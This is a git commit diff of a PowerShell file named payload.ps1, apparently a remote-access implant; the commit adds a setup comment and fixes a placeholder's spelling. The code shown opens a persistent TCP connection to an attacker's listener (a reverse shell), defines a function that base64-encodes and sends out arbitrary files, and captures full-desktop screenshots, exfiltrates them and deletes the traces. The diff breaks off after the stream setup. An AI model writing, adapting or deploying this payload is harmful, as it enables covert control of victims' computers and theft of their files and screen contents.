c6cddc70029c4a5d02e3e6972fae8b37c06beb73
AFNordal <36533217+AFNordal@users.noreply.github.com>
2019-07-12 11:53:02 +0200

    Update payload.ps1

--- payload.ps1
+++ payload.ps1
@@ -1,10 +1,11 @@
+# Replace '[LISTENER_ADDRESS]' with your listener's address, and '[LISTENER_PORT]' with your listener's port before serving the file.
 $pstr=@'
 function transfer($p){$a=[System.Convert]::ToBase64String([io.file]::ReadAllBytes("$p"));echo "`r`nFILE_START`r`n$a`r`nFILE_END"}
 function screenshot(){Add-Type -AssemblyName System.Windows.Forms,System.Drawing;$s=[Windows.Forms.Screen]::AllScreens;$b=[Drawing.Rectangle]::FromLTRB(($s.Bounds.Left|Measure-Object -Minimum).Minimum,($s.Bounds.Top|Measure-Object -Minimum).Minimum,($s.Bounds.Right|Measure-Object -Maximum).Maximum,($s.Bounds.Bottom|Measure-Object -Maximum).Maximum);$i=New-Object System.Drawing.Bitmap([int]$b.width),([int]$b.height);$g=[Drawing.Graphics]::FromImage($i);$g.CopyFromScreen($b.Location,[Drawing.Point]::Empty,$b.size);$i.Save("$env:USERPROFILE\q.png");$g.Dispose();$i.Dispose();transfer("$env:USERPROFILE\q.png");rm -Force "$env:USERPROFILE\q.png"}
 Function volume($v){$sh = new-object -com wscript.shell;1..50|%{$sh.SendKeys([char]174)};1..$v|%{$sh.SendKeys([char]175)}}
 while($true){
 	try{
-		$socket = new-object System.Net.Sockets.TcpClient("[LISTENER_ADRESS]", [LISTENER_PORT]);
+		$socket = new-object System.Net.Sockets.TcpClient("[LISTENER_ADDRESS]", [LISTENER_PORT]);
 		if($socket -eq $null){throw}
 		$stream = $socket.GetStream();
 		$writer = new-object System.IO.StreamWriter($stream);
